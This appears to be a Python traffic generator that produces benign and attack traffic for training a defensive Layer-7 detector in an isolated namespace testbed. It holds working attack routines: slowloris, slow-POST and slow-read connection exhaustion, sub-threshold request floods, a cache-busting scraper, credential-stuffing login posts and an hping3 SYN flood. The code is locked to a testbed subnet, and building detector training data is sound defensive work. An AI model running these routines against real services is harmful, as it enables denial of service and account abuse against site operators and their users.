"""Per-namespace traffic generator for the L7 capture (docs/L7_GRU_DESIGN.md §6; P3).

ml/capture_l7.py launches one of these inside each client/attacker namespace, via
the suite's run() and the venv python (for `requests`). It produces one client's
benign or sub-threshold-attack traffic against the testbed origin for a fixed time,
then exits.

Scope lock: it refuses to send unless the target is inside the testbed subnet
(10.0.0.0/16). It is a closed-loop generator for labelling L7 training data for the
defensive detector in an isolated namespace testbed, not a general tool — the attack
kinds are the same low-and-slow / sub-threshold patterns already in
test_distributed_suite.py, parameterised to stay below the daemon's ban thresholds
(ml/l7_traffic.calibrate()).

    <venv>/python ml/l7_gen.py --role benign --kind keepalive --host 10.0.0.1 \
        --port 443 --duration 60 --seed 7 --params '{"per_session":[4,12]}'
    ... --role attack --family slowloris --params '{"conns":6,"header_every_s":3}'
    ... --plan   # print what it would do and exit (offline, no sending)
"""
import argparse
import ipaddress
import json
import os
import random
import socket
import ssl
import subprocess
import sys
import time

import l7_benign  # ml/ is the script's directory, so it is on sys.path

TESTBED_NET = ipaddress.ip_network("10.0.0.0/16")
UAS = [
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101 Firefox/142.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) Mobile/15E148 Safari/604.1",
    "curl/8.18.0", "python-requests/2.32", "TestbedMonitor/1.0",
]
EXTS = ["js", "css", "png", "woff2", "json"]


def _paths(kind, rng):
    if kind == "browse":
        return rng.choice(["/", f"/page/{rng.randint(1, 12)}", "/api/nav",
                           f"/static/{rng.randint(1, 40)}.css"])
    if kind == "assets":
        return f"/static/{rng.randint(1, 60)}.{rng.choice(EXTS)}"
    if kind == "scrape":                     # high URI diversity (cache-busting)
        return rng.choice([f"/static/{rng.randrange(10**6)}.{rng.choice(EXTS)}",
                           f"/page/{rng.randrange(10**6)}"])
    return rng.choice(["/", f"/page/{rng.randint(1, 12)}", f"/api/{rng.randint(1, 9)}",
                       f"/static/{rng.randint(1, 40)}.{rng.choice(EXTS)}",
                       f"/search?q={rng.randint(1, 999)}"])


def _deadline(duration):
    return time.time() + duration


def _rate_sleep(rps, rng):
    # Poisson-ish spacing around the target rate.
    time.sleep(max(0.0, rng.expovariate(rps) if rps > 0 else 0.0))


def _base(host, port):
    return f"{'https' if port == 443 else 'http'}://{host}:{port}"


# ───────────────────────────── benign kinds ─────────────────────────────

def benign_curl_oneshot(host, port, params, dur, rng):
    lo, hi = params.get("think_s", [1.0, 3.0])
    end = _deadline(dur)
    while time.time() < end:
        url = _base(host, port) + _paths(params.get("paths", "mixed"), rng)
        subprocess.run(["curl", "-s", "-k", "-o", "/dev/null", "--max-time", "10",
                        "-A", rng.choice(UAS), url], capture_output=True, check=False)
        time.sleep(rng.uniform(lo, hi))


def benign_http2(host, port, params, dur, rng):
    lo, hi = params.get("think_s", [1.0, 2.0])
    n = params.get("parallel", 6)
    end = _deadline(dur)
    while time.time() < end:
        urls = [_base(host, port) + _paths("assets", rng) for _ in range(n)]
        subprocess.run(["curl", "-s", "-k", "--http2", "--parallel", "-o", "/dev/null",
                        "--max-time", "10", "-A", rng.choice(UAS), *urls],
                       capture_output=True, check=False)
        time.sleep(rng.uniform(lo, hi))


def _session_browse(sess, host, port, params, rng, end):
    import requests
    lo, hi = params.get("think_s", [0.5, 2.0])
    per_lo, per_hi = params.get("per_session", [4, 12])
    headers = {"User-Agent": rng.choice(UAS)}
    for _ in range(rng.randint(per_lo, per_hi)):
        if time.time() >= end:
            break
        try:
            sess.get(_base(host, port) + _paths(params.get("paths", "browse"), rng),
                     headers=headers, verify=False, timeout=10)
        except requests.RequestException:
            break
        time.sleep(rng.uniform(lo, hi))


def benign_keepalive(host, port, params, dur, rng):
    import requests
    end = _deadline(dur)
    while time.time() < end:
        with requests.Session() as sess:
            _session_browse(sess, host, port, params, rng, end)
        time.sleep(rng.uniform(0.5, 2.0))


def benign_api_poll(host, port, params, dur, rng):
    import requests
    lo, hi = params.get("interval_s", [0.5, 1.5])
    path = params.get("path", "/api/status")
    end = _deadline(dur)
    with requests.Session() as sess:
        while time.time() < end:
            try:
                sess.get(_base(host, port) + path, verify=False, timeout=10,
                         headers={"User-Agent": "TestbedMonitor/1.0"})
            except requests.RequestException:
                pass
            time.sleep(rng.uniform(lo, hi))


def benign_downloader(host, port, params, dur, rng):
    import requests
    lo, hi = params.get("think_s", [5.0, 15.0])
    path = params.get("path", "/download/large")
    end = _deadline(dur)
    while time.time() < end:
        try:
            requests.get(_base(host, port) + path, verify=False, timeout=30)
        except requests.RequestException:
            pass
        time.sleep(rng.uniform(lo, hi))


def benign_uploader(host, port, params, dur, rng):
    import requests
    lo, hi = params.get("think_s", [4.0, 10.0])
    blo, bhi = params.get("body_bytes", [200, 60000])
    path = params.get("path", "/upload")
    end = _deadline(dur)
    while time.time() < end:
        body = b"x" * rng.randint(blo, bhi)
        try:
            requests.post(_base(host, port) + path, data=body, verify=False, timeout=15)
        except requests.RequestException:
            pass
        time.sleep(rng.uniform(lo, hi))


def benign_nat_gateway(host, port, params, dur, rng):
    """Several independent users behind one IP (keep-alive browsing each)."""
    import threading
    users = params.get("users", 8)
    threads = [threading.Thread(target=benign_keepalive,
                                args=(host, port, params, dur, random.Random(rng.randrange(2**31))),
                                daemon=True) for _ in range(users)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()


# ── P5b benign kinds (docs/L7_GRU_DESIGN.md §7.2): each executes the plan that
#    l7_benign.plan_client() builds from this process's seed — the same plan the
#    admissibility gate (ml/l7_admissibility.py) simulated. ──

def _quiet_get(sess, url):
    import requests
    try:
        sess.get(url, verify=False, timeout=10)
    except requests.RequestException:
        pass


def _session(ua, conns):
    """A keep-alive session with `conns` persistent connections (HTTP/1.1, §7.2.1)."""
    import requests
    from requests.adapters import HTTPAdapter
    sess = requests.Session()
    adapter = HTTPAdapter(pool_connections=1, pool_maxsize=conns)
    sess.mount("http://", adapter)
    sess.mount("https://", adapter)
    sess.headers["User-Agent"] = ua
    return sess


def _browser_device(base, user, start, end):
    """Load each view's waves in order (a wave fans out over the device's connections),
    then wait the view's pause. Network time stretches the nominal timeline; it never
    compresses it."""
    from concurrent.futures import ThreadPoolExecutor
    views = user["views"]
    if not views:
        return
    time.sleep(max(0.0, min(start + views[0]["t"], end) - time.time()))
    with _session(user["ua"], l7_benign.BROWSER_CONNS) as sess, \
            ThreadPoolExecutor(l7_benign.BROWSER_CONNS) as pool:
        for v in views:
            if time.time() >= end:
                break
            for wave in v["waves"]:
                if wave:
                    list(pool.map(lambda p, _s=sess: _quiet_get(_s, base + p), wave))
            time.sleep(max(0.0, min(v["pause_s"], end - time.time())))


def _paced_user(base, user, end):
    with _session(user["ua"], 1) as sess:
        for path, gap in user["requests"]:
            if time.time() >= end:
                break
            _quiet_get(sess, base + path)
            time.sleep(max(0.0, min(gap, end - time.time())))


def _run_plan(kind, host, port, params, dur, rng):
    import threading
    plan = l7_benign.plan_client(kind, params, dur, rng)
    base, start = _base(host, port), time.time()
    end = start + dur
    targets = [(_browser_device, (base, u, start, end)) if "views" in u
               else (_paced_user, (base, u, end)) for u in plan["users"]]
    threads = [threading.Thread(target=f, args=a, daemon=True) for f, a in targets]
    for t in threads:
        t.start()
    for t in threads:
        t.join()


def benign_browser_page(host, port, params, dur, rng):
    _run_plan("browser_page", host, port, params, dur, rng)


def benign_cgnat_browsers(host, port, params, dur, rng):
    _run_plan("cgnat_browsers", host, port, params, dur, rng)


def benign_api_bulk(host, port, params, dur, rng):
    _run_plan("api_bulk", host, port, params, dur, rng)


def benign_crawler_polite(host, port, params, dur, rng):
    _run_plan("crawler_polite", host, port, params, dur, rng)


# ───────────────────────────── attack families ─────────────────────────────

def attack_rate_get(host, port, params, dur, rng, path_fn=None, extra_headers=None):
    """Rate-bounded GETs at params['rps'] (< the daemon's ban threshold)."""
    import requests
    rps = params["rps"]
    end = _deadline(dur)
    headers = {"User-Agent": rng.choice(UAS)}
    if extra_headers:
        headers.update(extra_headers)
    with requests.Session() as sess:
        while time.time() < end:
            url = _base(host, port) + (path_fn(rng) if path_fn
                                       else _paths(params.get("paths", "mixed"), rng))
            try:
                sess.get(url, headers=headers, verify=False, timeout=10)
            except requests.RequestException:
                pass
            _rate_sleep(rps, rng)


def attack_subthreshold_flood(host, port, params, dur, rng):
    attack_rate_get(host, port, params, dur, rng)


def attack_scraper(host, port, params, dur, rng):
    attack_rate_get(host, port, params, dur, rng, path_fn=lambda r: _paths("scrape", r))


def attack_padded_flood(host, port, params, dur, rng):
    pad = "P" * params.get("pad_header_bytes", 500)
    attack_rate_get(host, port, params, dur, rng, extra_headers={"X-Pad": pad})


def attack_credstuff(host, port, params, dur, rng):
    import requests
    rps = params["rps"]
    path = params.get("path", "/login")
    end = _deadline(dur)
    with requests.Session() as sess:
        while time.time() < end:
            body = json.dumps({"u": f"user{rng.randrange(10**6)}", "p": "x" * 12}).encode()
            try:
                sess.post(_base(host, port) + path, data=body, verify=False, timeout=10,
                          headers={"User-Agent": rng.choice(UAS)})
            except requests.RequestException:
                pass
            _rate_sleep(rps, rng)


def _open_sockets(host, port, n, send_head):
    socks = []
    for _ in range(n):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((host, port))
            if port == 443:
                ctx = ssl._create_unverified_context()   # testbed self-signed cert
                s = ctx.wrap_socket(s, server_hostname="localhost")
            s.sendall(send_head)
            socks.append(s)
        except OSError:
            pass
    return socks


def attack_slowloris(host, port, params, dur, rng):
    """`conns` (< ban threshold) connections, each dribbling one header line every
    header_every_s (< the 5 s header timeout), never completing the request."""
    conns = params["conns"]
    every = params["header_every_s"]
    head = (f"GET /?r={rng.randrange(10**6)} HTTP/1.1\r\nHost: {host}\r\n"
            f"User-Agent: {rng.choice(UAS)}\r\n").encode()
    socks = _open_sockets(host, 80, conns, head)       # slowloris is plaintext here
    end = _deadline(dur)
    while time.time() < end and socks:
        for s in list(socks):
            try:
                s.sendall(f"X-{rng.randrange(10**4)}: {rng.randrange(10**4)}\r\n".encode())
            except OSError:
                socks.remove(s)
        time.sleep(every)
    for s in socks:
        s.close()


def attack_slowpost(host, port, params, dur, rng):
    """`conns` slow-body POSTs: Content-Length <= 64 KiB (no 413), one body byte
    every byte_every_s (< the 5 s body timeout, so no RUDY ban), looping."""
    conns = params["conns"]
    every = params["byte_every_s"]
    n = min(params.get("body_bytes", 60000), 65536)
    head = (f"POST /upload HTTP/1.1\r\nHost: {host}\r\n"
            f"Content-Type: application/octet-stream\r\nContent-Length: {n}\r\n\r\n").encode()
    socks = _open_sockets(host, 80, conns, head)
    sent = {id(s): 0 for s in socks}
    end = _deadline(dur)
    while time.time() < end and socks:
        for s in list(socks):
            try:
                s.sendall(b"x")
                sent[id(s)] += 1
                if sent[id(s)] >= n:         # body finished: reopen a fresh slow POST
                    s.close()
                    socks.remove(s)
            except OSError:
                socks.remove(s)
        if len(socks) < conns:
            for s in _open_sockets(host, 80, conns - len(socks), head):
                socks.append(s)
                sent[id(s)] = 0
        time.sleep(every)
    for s in socks:
        s.close()


def attack_slowread(host, port, params, dur, rng):
    """`conns` connections that request a large response and read it slowly."""
    conns = params["conns"]
    every = params["read_every_s"]
    path = params.get("path", "/download/large")
    head = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {rng.choice(UAS)}\r\n\r\n".encode()
    socks = _open_sockets(host, 80, conns, head)
    end = _deadline(dur)
    while time.time() < end and socks:
        for s in list(socks):
            try:
                if not s.recv(256):          # advertise a tiny read rate
                    socks.remove(s)
            except OSError:
                socks.remove(s)
        time.sleep(every)
    for s in socks:
        s.close()


def attack_volumetric_flood(host, port, params, dur, rng):
    """A short SYN flood (hping3), so benign L7 traffic is seen distorted (§5.6).
    The attacker's own L4 packets are not L7 requests; its effect is on others."""
    proc = subprocess.Popen(["hping3", "-S", "-p", "80", "-i", "u500", host],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        time.sleep(params.get("dur_s", dur))
    finally:
        proc.terminate()


BENIGN = {"curl_oneshot": benign_curl_oneshot, "http2": benign_http2,
          "keepalive": benign_keepalive, "api_poll": benign_api_poll,
          "downloader": benign_downloader, "uploader": benign_uploader,
          "nat_gateway": benign_nat_gateway, "browser_page": benign_browser_page,
          "cgnat_browsers": benign_cgnat_browsers, "api_bulk": benign_api_bulk,
          "crawler_polite": benign_crawler_polite}
ATTACK = {"subthreshold_flood": attack_subthreshold_flood, "scraper": attack_scraper,
          "padded_flood": attack_padded_flood, "credstuff": attack_credstuff,
          "slowloris": attack_slowloris, "slowpost": attack_slowpost,
          "slowread": attack_slowread, "volumetric_flood": attack_volumetric_flood}


def resolve(role, name):
    table = BENIGN if role == "benign" else ATTACK
    if name not in table:
        raise SystemExit(f"[-] unknown {role} kind/family: {name} (have {sorted(table)})")
    return table[name]


def main(argv=None):
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--role", required=True, choices=("benign", "attack"))
    ap.add_argument("--kind", help="benign kind")
    ap.add_argument("--family", help="attack family")
    ap.add_argument("--host", required=True)
    ap.add_argument("--port", type=int, default=80)
    ap.add_argument("--duration", type=float, required=True)
    ap.add_argument("--seed", type=int, default=0)
    ap.add_argument("--params", default="{}", help="JSON params")
    ap.add_argument("--plan", action="store_true", help="print the plan and exit (no sending)")
    args = ap.parse_args(argv)

    name = args.kind if args.role == "benign" else args.family
    params = json.loads(args.params)
    fn = resolve(args.role, name)
    plan = {"role": args.role, "name": name, "host": args.host, "port": args.port,
            "duration": args.duration, "seed": args.seed, "params": params}
    if args.plan:
        print(json.dumps(plan))
        return 0
    try:
        if ipaddress.ip_address(args.host) not in TESTBED_NET:
            raise SystemExit(f"[-] refusing: {args.host} is outside the testbed net {TESTBED_NET}")
    except ValueError:
        raise SystemExit(f"[-] refusing: {args.host} is not a testbed IP") from None
    if args.port == 443:
        os.environ.setdefault("PYTHONWARNINGS", "ignore")      # self-signed cert
    fn(args.host, args.port, params, args.duration, random.Random(args.seed))
    return 0


if __name__ == "__main__":
    sys.exit(main())
